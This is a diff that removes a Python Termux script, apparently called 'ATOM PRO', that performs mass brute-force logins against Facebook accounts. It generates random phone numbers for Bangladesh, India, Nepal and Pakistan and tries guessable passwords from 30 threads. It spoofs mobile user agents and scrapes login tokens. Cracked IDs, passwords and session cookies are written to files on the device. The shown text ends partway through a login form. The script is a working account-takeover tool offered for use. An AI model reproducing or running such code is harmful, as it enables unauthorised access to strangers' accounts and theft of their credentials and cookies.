@@ -1,367 +1,617 @@
-#▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭#
-import os,time,sys,re,string,uuid,json,random
-from concurrent.futures import ThreadPoolExecutor as threadpol
-from os import system as magi
-#▬▭▬▭▬▭▬▭[ COLLOR VARIABLES ]▬▭▬▭▬▭▬▭#
-a="\033[1;97m";b="\033[1;92m";c="\033[1;91m";d="\033[1;32m";e="\033[1;37m";f="\033[1;96m";g="\033[1;93m";h="\033[1;94m";i="\033[1;95m";j="\x1b[38;5;208m"
-#▬▭▬▭▬▭▬▭[ OPTION VARIABLES ]▬▭▬▭▬▭▬▭#
-l1=f"{a}[{b}1{a}]";l2=f"{a}[{b}2{a}]";l3=f"{a}[{b}3{a}]";l4=f"{a}[{b}4{a}]";l5=f"{a}[{b}5{a}]";l6=f"{a}[{b}6{a}]";l7=f"{a}[{b}7{a}]";l0=f"{a}[{c}0{a}]";ekual=f"{f}:{a}"
-#▬▭▬▭▬▭▬▭[ ENABLE SDCARD ]▬▭▬▭▬▭▬▭#
-try:magi('rm -rf /sdcard/..txt');open('/sdcard/..txt','a').write(' ')
-except PermissionError:magi("clear");print(f" {b}Please enable storage permission to continue{a}");magi("termux-setup-storage");exit()
-#▬▭▬▭▬▭▬▭[ INSTALL ]▬▭▬▭▬▭▬▭#
-try:import requests
-except ModuleNotFoundError:
-    magi("clear");print(f"{b} Installing Module .... ");magi("pip install requests > /dev/null")
-#▬▭▬▭▬▭▬▭[ LINE ]▬▭▬▭▬▭▬▭#
-sxrline=f"{f}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•"
-#▬▭▬▭▬▭▬▭[ APPEND ]▬▭▬▭▬▭▬▭#
-loop=0
-oks,cps,psw,sxr_mthd,numnx,pmsn_ckki=[],[],[],[],[],[]
-sys.stdout.write('\x1b]2; Mr. SxR\x07')
-#▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭#
-def clr_logo():
-    magi("clear")
-    print(f"""\033[38;5;33m
-    █████╗ ████████╗ ██████╗ ███╗   ███╗
-   ██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║
-   ███████║   ██║   ██║   ██║██╔████╔██║
-   ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
-   ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
-   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \x1b[38;1;97m ᴾᴿᴼ
-{sxrline}
- {a}[{b}●{a}] {a}TOOL OWNER    {f}:{b} SUMON ROY
- {a}[{b}●{a}] {a}TOOL STATUS   {f}:{a} PRIVATE
- {a}[{b}●{a}] {a}TOOL VERSION  {f}:{j} V-109.0.5.0.3
-{sxrline}""")
-#▬▭▬▭▬▭▬▭[ MAIN DEF ]▬▭▬▭▬▭▬▭#
-def sxr_main():
-    clr_logo()
-    print(f" {l1} RANDOM CLONING\n {l2} CONTACT ADMIN\n {l0} EXIT\n{sxrline}")
-    chic_opsn=input(f"{b} CHOOSE AN OPTION {ekual} ")
-    if chic_opsn in ['1','01','A','a']:sxr_random()
-    elif chic_opsn in ['2','02','B','b']:magi("xdg-open https://www.facebook.com/sxr.404");sxr_main()
-    elif chic_opsn in ['0','00','O','o']:exit()
-    else:print(f"\n{c} You have selected the wrong option..");time.sleep(4);sxr_main()
-#▬▭▬▭▬▭▬▭[ SxR RANDOM ]▬▭▬▭▬▭▬▭#
-def sxr_random():
-    clr_logo();print(f' {l1} BD CLONING\n {l2} INDIA CLONING\n {l3} NEPAL CLONING\n {l4} PAK CLONING\n {l0} BACK MENU\n{sxrline}')
-    option=input(f'{b} CHOOSE AN OPTION {ekual} ')
-    if option in ['1','01','A','a']:sxr_bd()
-    elif option in ['2','02','B','b']:sxr_ind()
-    elif option in ['3','03','C','c']:sxr_npl()
-    elif option in ['4','04','D','d']:sxr_pak()
-    elif option in ['0','00','O','o']:sxr_main()
-    else:print(f"\n {c}You have selected the wrong option..");time.sleep(4);sxr_random()
-#▬▭▬▭▬▭▬▭[ SxR RANDOM BD ]▬▭▬▭▬▭▬▭#
-def sxr_bd():
-    clr_logo();print(f"{b} EXAMPLE {ekual} {f}017 {a}- {f}018 {a}- {f}019 {a}- {f}016{f}\n{sxrline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
-    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{sxrline}")
-    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
-    except ValueError:LiMit = 50000
-    for number in range(LiMit):
-        numx = ''.join(random.choice(string.digits) for i in range(8))
-        numnx.append(numx)
-    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} www.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{sxrline}")
-    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
-    if mthd_svr in ['a','A','1','01']:fb="m"
-    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
-    elif mthd_svr in ['c','C','3','03']:fb="free"
-    elif mthd_svr in ['d','D','4','04']:fb="p"
-    elif mthd_svr in ['e','E','5','05']:fb="x"
-    elif mthd_svr in ['f','F','6','06']:fb="www"
-    elif mthd_svr in ['g','G','7','07']:fb="d"
-    else:fb="mbasic"
-#
-    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n{sxrline}")
-    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
-    if mthd_inn in ['a','A','1','01']:sxr_mthd.append("A")
-    elif mthd_inn in ['b','B','2','02']:sxr_mthd.append("B")
-    else:sxr_mthd.append("B")
-    clr_logo()
-    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
-    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
-    else:pmsn_ckki.append(f'y')
-    with threadpol(max_workers=30) as sifaxxx:
-        clr_logo()
-        total_l = str(len(numnx))
-        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
-        for hugu in numnx:
-            ids = sim_code+hugu
-            passlist = [ids[:6],ids[:7],ids,hugu,'Bangladesh','bangladesh']
-            if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
-            elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
-    print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SxR-IDS/ok&cp.txt{f}\n{sxrline}");exit()
-#▬▭▬▭▬▭▬▭[ SxR RANDOM INDIA ]▬▭▬▭▬▭▬▭#
-def sxr_ind():
-    clr_logo();print(f"{b} EXAMPLE {ekual} {f}6390 {a}- {f}6354{a}- {f}9340 {a}- {f}9749\n{sxrline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
-    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{sxrline}")
-    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
-    except ValueError:LiMit = 50000
-    for number in range(LiMit):
-        numx = ''.join(random.choice(string.digits) for i in range(6))
-        numnx.append(numx)
-    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} www.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{sxrline}")
-    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
-    if mthd_svr in ['a','A','1','01']:fb="m"
-    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
-    elif mthd_svr in ['c','C','3','03']:fb="free"
-    elif mthd_svr in ['d','D','4','04']:fb="p"
-    elif mthd_svr in ['e','E','5','05']:fb="x"
-    elif mthd_svr in ['f','F','6','06']:fb="www"
-    elif mthd_svr in ['g','G','7','07']:fb="d"
-    else:fb="mbasic"
-#
-    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n{sxrline}")
-    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
-    if mthd_inn in ['a','A','1','01']:sxr_mthd.append("A")
-    elif mthd_inn in ['b','B','2','02']:sxr_mthd.append("B")
-    else:sxr_mthd.append("B")
-    clr_logo()
-    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
-    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
-    else:pmsn_ckki.append(f'y')
-    with threadpol(max_workers=30) as sifaxxx:
-        clr_logo()
-        total_l = str(len(numnx))
-        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
-        for hugu in numnx:
-            ids = sim_code+hugu
-            passlist = [ids[:6],ids[:7],'57273200','57575751']
-            if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
-            elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
-    print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SxR-IDS/ok&cp.txt{f}\n{sxrline}");exit()
-#▬▭▬▭▬▭▬▭[ SxR RANDOM NEPAL ]▬▭▬▭▬▭▬▭#
-def sxr_npl():
-    clr_logo();print(f"{b} EXAMPLE {ekual} {f}9815 {a}- {f}9814 {a}- {f}9861 {a}- {f}9840\n{sxrline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
-    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{sxrline}")
-    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
-    except ValueError:LiMit = 50000
-    for number in range(LiMit):
-        numx = ''.join(random.choice(string.digits) for i in range(6))
-        numnx.append(numx)
-    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} www.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{sxrline}")
-    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
-    if mthd_svr in ['a','A','1','01']:fb="m"
-    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
-    elif mthd_svr in ['c','C','3','03']:fb="free"
-    elif mthd_svr in ['d','D','4','04']:fb="p"
-    elif mthd_svr in ['e','E','5','05']:fb="x"
-    elif mthd_svr in ['f','F','6','06']:fb="www"
-    elif mthd_svr in ['g','G','7','07']:fb="d"
-    else:fb="mbasic"
-#
-    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n{sxrline}")
-    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
-    if mthd_inn in ['a','A','1','01']:sxr_mthd.append("A")
-    elif mthd_inn in ['b','B','2','02']:sxr_mthd.append("B")
-    else:sxr_mthd.append("B")
-    clr_logo()
-    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
-    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
-    else:pmsn_ckki.append(f'y')
-    with threadpol(max_workers=30) as sifaxxx:
-        clr_logo()
-        total_l = str(len(numnx))
-        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
-        for hugu in numnx:
-            ids = sim_code+hugu
-            passlist = [ids[:6],ids[:7],'nepal123']
-            if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
-            elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
-    print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SxR-IDS/ok&cp.txt{f}\n{sxrline}");exit()
-#▬▭▬▭▬▭▬▭[ SxR RANDOM PAKISTAN ]▬▭▬▭▬▭▬▭#
-def sxr_pak():
-    clr_logo();print(f"{b} EXAMPLE {ekual} {f}0300 {a}- {f}0340 {a}- {f}0320 {a}- {f}0330\n{sxrline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
-    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{sxrline}")
-    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
-    except ValueError:LiMit = 50000
-    for number in range(LiMit):
-        numx = ''.join(random.choice(string.digits) for i in range(7))
-        numnx.append(numx)
-    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} www.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{sxrline}")
-    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
-    if mthd_svr in ['a','A','1','01']:fb="m"
-    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
-    elif mthd_svr in ['c','C','3','03']:fb="free"
-    elif mthd_svr in ['d','D','4','04']:fb="p"
-    elif mthd_svr in ['e','E','5','05']:fb="x"
-    elif mthd_svr in ['f','F','6','06']:fb="www"
-    elif mthd_svr in ['g','G','7','07']:fb="d"
-    else:fb="mbasic"
-#
-    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n{sxrline}")
-    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
-    if mthd_inn in ['a','A','1','01']:sxr_mthd.append("A")
-    elif mthd_inn in ['b','B','2','02']:sxr_mthd.append("B")
-    else:sxr_mthd.append("B")
-    clr_logo()
-    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
-    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
-    else:pmsn_ckki.append(f'y')
-    with threadpol(max_workers=30) as sifaxxx:
-        clr_logo()
-        total_l = str(len(numnx))
-        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
-        for hugu in numnx:
-            ids = sim_code+hugu
-            passlist = [ids[:6],ids[:7],'khan1234']
-            if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
-            elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
-    print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SxR-IDS/ok&cp.txt{f}\n{sxrline}");exit()
-#▬▭▬▭▬▭▬▭[ RANDOM MATHOD - 1 ]▬▭▬▭▬▭▬▭#
-#app login
-def rndm1(ids,passlist,mthd_svr,fb):
-    global loop,oks,cps
-    try:
-        for pww in passlist:
-            session = requests.Session()
-            sys.stdout.write(f"\r\r {a}[{b}SxR-M1{a}] {loop}{f}|{b}OK-{str(len(oks))}  {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
-            sm_mdl=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
-            #ua1 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(sm_mdl))+"; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
-            ua3 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm_mdl))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
-            git_fb = session.get(f"https://{fb}.facebook.com/login.php?skip_api_login=1&api_key=212500508799908&kid_directed_site=0&app_id=212500508799908&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr").text
-            logn_data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(git_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(git_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pww,'jazoest': re.search('name="jazoest" value="(.*?)"', str(git_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
-            user_info = {'Host': f'{fb}.facebook.com',
-            'Connection': 'keep-alive',
-            'Content-Length': '{len(str(logn_data))}',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-model': '"GT-414XOP"',
-            'sec-ch-ua-mobile': '?1',
-            'User-Agent': ua3,
-            'viewport-width': '400',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),
-            'sec-ch-ua-platform-version': '"9.0.0"',
-            'X-ASBD-ID': '129477',
-            'dpr': '1.8',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua-platform': '"Android"',
-            'Accept': '*/*',
-            'Origin': f'https://{fb}.facebook.com',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Dest': 'empty',
-            'Referer': f'https://{fb}.facebook.com/login.php?skip_api_login=1&api_key=212500508799908&kid_directed_site=0&app_id=212500508799908&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}
-            url = f"https://{fb}.facebook.com/login/device-based/login/async/?api_key=212500508799908&auth_token=aedffdb1606919704ead2d4fa891ac15&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&refsrc=deprecated&app_id=212500508799908&cancel=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&lwv=100"
-            sxr_respns = session.post(url,data=logn_data, headers=user_info,allow_redirects=False).text
-            login_coki=session.cookies.get_dict().keys()
-            if 'c_user' in login_coki:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                uid=re.findall("c_user=(.*);xs", coki)[0]
-                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
-                respns=requests.get(ckk).text
-                if 'Photoshop' in respns:
-                    print(f"\r\r {b}[SxR-OK] {uid} | {pww}")
-                    if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIES : {coki}\n")
-                    open('/sdcard/SxR-RNDM-OK-COOKIE.txt.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
-                    open('/sdcard/SxR-RNDM-OK.txt','a').write(uid+'|'+pww+'\n')
-                    oks.append(uid)
-                    break
-                else:break
-            elif 'checkpoint' in login_coki:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                xx=coki.split('checkpoint=')[1]
-                uid=re.search('%22%3A(.*?)%2C%22', str(xx)).group(1)
-                #print(f"\r\r {c}[SxR-CP] {uid} | {pww}")
-                open('/sdcard/SxR-RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
-                cps.append(uid)
-                break
-            else:continue
-        loop+=1
-    except requests.exceptions.ConnectionError:time.sleep(6)
-    except Exception as e:pass
-#▬▭▬▭▬▭▬▭[ RANDOM MATHOD - 2 ]▬▭▬▭▬▭▬▭#
-def rndm2(ids,passlist,mthd_svr,fb):
-    global loop,oks,cps
-    try:
-        for pww in passlist:
-            session = requests.Session()
-            sys.stdout.write(f"\r\r {a}[{b}SxR-M2{a}] {loop}{f}|{b}OK-{str(len(oks))}  {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
-            lenovo = ("L18021","PAGK0027IN","L19111","L10041","A7010a48","K350t","K33a48","Lenovo K7","K8 Note","L38043","PAFR0026IN","Lenovo K11","Lenovo K12","Lenovo K13","Lenovo K14")
-            ua1 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(lenovo))+"; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
-            #ua3 = f"Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(mdlx))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
-            referer_url = f'https://www.facebook.com/login/web/?cuid=AYjpakrqTxrj5wFmV-QKHtvBbm2N0-lN7kL6BSohrV5OSxEQiELa8jUVPNKttxFGxP_fEKh2T4jjljwjvXxMxv_CLYnEqFpruZ4J2J-leEJbo7bKf5HIH2jW5aGCKe2zHZVeNfNwvo7aTAsQuFox5426R-oiVC3bV5-Mv6FylyvXu-4TlUVzq3_kNNNbXYJB95Elmh2S5rxVZGI6E8ORDJzoYWa9H2aU5wo4u9V5NE68uP6w4LXSEFcMbPZ91JWBUUznW4V3s0vc7lLiWt12J-cpexhphXL9pzjsXIURSjPNng&email={ids}&is_from_lara=1'
-            cuidv = session.get(referer_url).text
-            logn_data = {
-            'jazoest':re.search('name="jazoest" value="(.*?)"', str(cuidv)).group(1),
-            'lsd':re.search('name="lsd" value="(.*?)"', str(cuidv)).group(1),
-            'display': '',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '',
-            'signed_next': '',
-            'trynum': '1',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '054835_NX-n',
-            'lgnjs': '1724503715',
-            'cuid':re.search('name="cuid" value="(.*?)"', str(cuidv)).group(1),
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'false',
-            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK/KKAAAAAAAEAA',
